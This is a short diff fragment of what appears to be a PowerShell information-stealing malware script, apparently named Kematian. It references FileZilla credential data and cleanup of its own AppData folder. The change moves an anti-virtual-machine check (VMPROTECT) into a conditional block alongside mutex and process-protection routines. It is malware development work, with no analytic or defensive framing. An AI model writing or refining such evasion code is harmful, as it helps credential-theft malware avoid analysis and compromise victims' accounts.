@@ -1116,9 +1116,8 @@ FileZilla: $filezilla_info
     Remove-Item "$env:appdata\Kematian" -Force -Recurse
 }
 
-VMPROTECT
-
 if (CHECK_AND_PATCH -eq $true) {
+    VMPROTECT
     KDMUTEX
     if (!($debug)) {
         [ProcessUtility]::MakeProcessKillable()
